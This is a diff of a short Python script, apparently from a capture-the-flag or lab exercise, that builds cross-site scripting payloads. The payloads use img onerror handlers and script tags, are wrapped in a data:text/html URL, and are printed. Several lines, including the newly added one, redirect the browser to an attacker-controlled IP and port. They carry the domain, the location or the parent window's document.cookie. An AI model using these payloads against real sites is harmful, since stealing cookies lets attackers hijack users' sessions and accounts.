@@ -11,6 +11,8 @@ myport = 8000
 script = f'<img src="x" onerror="window.location.href=\'http://{myip}:{myport}?d=\'+document.domain">'
 # script = f'<img src="http://{myip}:{myport}?x=server2&d="\'+document.domain+\'">\')</script>'
 # script = f'<script>document.write(\'<img src="http://{myip}:{myport}/?c=\'+document.location+\')">\')</script>'
+script = f'<img src=x onerror="parent.location.href=\'http://{myip}:{myport}?d=\'+window.parent.document.cookie">'
+#script = '<img src=x onerror="parent.postMessage({data:\'test\'}, \'http://10.10.10.3\')>'
 payload = f'data:text/html;charset=utf-8,{script}'
 
 print(payload)
